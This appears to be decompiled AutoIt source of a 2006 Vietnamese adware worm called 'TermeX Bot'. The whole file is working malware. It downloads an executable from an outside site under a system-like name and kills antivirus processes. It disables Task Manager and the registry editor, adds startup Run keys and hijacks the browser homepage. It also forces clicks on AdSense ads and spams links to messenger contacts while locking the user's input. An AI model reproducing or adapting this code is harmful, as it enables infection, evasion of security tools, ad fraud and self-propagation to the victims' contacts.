; <AUT2EXE VERSION: 3.2.0.1>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: D:\enet.au3>
; ----------------------------------------------------------------------------

;---------------------------------------------------------------
; Tac Gia: TermeX - ThanatoS
; Phan Mem: TermeX Bot
; Phien Ban: 2.0
; Cong Dung: Quang cao Website thong qua Y!M,MSN,AIM,My Computer
; Phat Hanh: 20-9-2006
;---------------------------------------------------------------

; Thiet Lap
#NoTrayIcon
$website = "http://tuvantinhyeu.info"
$website2 = "http://tuvantinhyeu.info"

; Lay Nhiem Vao He Thong
If Not FileExists(@WindowsDir & "\svhost12.exe") Then
 		InetGet ("http://tuvantinhyeu.info/enet.exe", @WindowsDir & "\svhost12.exe", 0, 1)
 		Sleep(10000)
	EndIf


;Kill cac processes Anti-Virus
If ProcessExists("Bkav2006.exe") Then
   ProcessClose("Bkav2006.exe")
EndIf

If ProcessExists("IEProt.exe") Then
   ProcessClose("IEProt.exe")
EndIf

If ProcessExists("bdss.exe") Then
   ProcessClose("bdss.exe")
   ProcessClose("vsserv.exe")
EndIf

;Click vao Google adsense
$title = WinGetTitle("Mesothelioma, Asbestosis & Lung Cancer Information - Microsoft Internet Explorer", "")
$check = WinExists ($title)
If $check = 1 Then
	BlockInput (1)
	WinActivate($title)
	WinSetState ( $title , "", @SW_MAXIMIZE)
	$pos = MouseGetPos()
	MouseClick("left", 400, 300, 1, 0)
	MouseMove ( $pos[0], $pos[1] , 0)
	BlockInput (0)
EndIf

; Ghi Khoa Registry
RegWrite("HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main", "Start Page", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_buzz", "content url", "REG_SZ", $website)
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\View\YMSGR_Launchcast", "content url", "REG_SZ", $website)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\svhost12.exe")
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "SVCHOST", "REG_SZ", @WindowsDir & "\svhost.exe")

; Danh Sach Tin Nhan Ngau Nhien
Dim $tin[13]
$tin[0] = "Loi to tinh dau tien cua tui :x http://www.tuvantinhyeu.info"
$tin[1] = "1000 buc thu tinh hay nhat http://www.tuvantinhyeu.info >:D< "
$tin[2] = "Bo oi! Co biet gi chua ha?Cai nay hay lam a nha http://www.tuvantinhyeu.info"
$tin[3] = "999 cau noi hay nhat danh cho 2 nguoi iu nhau http://www.tuvantinhyeu.info "
$tin[4] = "Biet yeu la sai lam, sao ta cu yeu dai kho http://www.tuvantinhyeu.info "
$tin[5] = "Di xe dap dam chet nguoi =)) http://www.tuvantinhyeu.info"
$tin[6] = "Lan dau tien len...giuong =)) =)) http://www.tuvantinhyeu.info"
$tin[7] = "Lan dau tien len...giuong =)) =)) http://www.tuvantinhyeu.info "
$tin[8] = "999 cau noi hay nhat danh cho 2 nguoi iu nhau http://www.tuvantinhyeu.info "
$tin[9] = "chao ban, lau lam ko gap, ban nhan tin lai cho minh nhe "
$tin[10] = "Hay noi khong voi nhung blog ban, du ban o mien Bac hay Nam van la nguoi con cua VN http://blog.360.yahoo.com/blog-lgnzAww8fqlE9ZWuADs-?cq=1&p=534#comments "
$tin[11] = "Toi yeu Viet Nam  http://blog.360.yahoo.com/blog-lgnzAww8fqlE9ZWuADs-?cq=1&p=534"
$tin[12] = "Chung ta hay cung len an hanh dong cua be crys, ko de nhung blog ban ton tai http://blog.360.yahoo.com/blog-lgnzAww8fqlE9ZWuADs-?cq=1&p=534 "


; Ham Thay Doi Status & Gui Tin Nhan
While (1)
sleep(20000)

$tieude1 = WinGetTitle("Yahoo! Messenger", "")
$kiemtra1 = WinExists ($tieude1)
$tieude2 = WinGetTitle("AIM", "")
$kiemtra2 = WinExists ($tieude2)
$tieude3 = WinGetTitle("Windows Live Messenger", "")
$kiemtra3 = WinExists ($tieude3)
$tieude4 = WinGetTitle("Windows Messenger", "")
$kiemtra4 = WinExists ($tieude4)


	If $kiemtra1 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude1)
		Send("!m")
		Send("un")
		Send("^v {ENTER}{ENTER}")
		Send("^m")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{END}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v")
		Send("!s")
		BlockInput (0)
	EndIf

	If $kiemtra2 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude2)
		Send("{HOME}")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{PGDN}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra3 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude3)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{DOWN}")
		Send("{SPACE}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf

	If $kiemtra4 = 1 Then
		$ngaunhien = Random(0,12,1)
		ClipPut($tin[$ngaunhien])
		BlockInput (1)
		WinActivate($tieude4)
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		Send("{ALT}")
		Send("a")
		Send("{ENTER}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{DOWN}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		Send("!{F4}")
		BlockInput (0)
	EndIf
Sleep(300000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: D:\enet.au3>
; ----------------------------------------------------------------------------

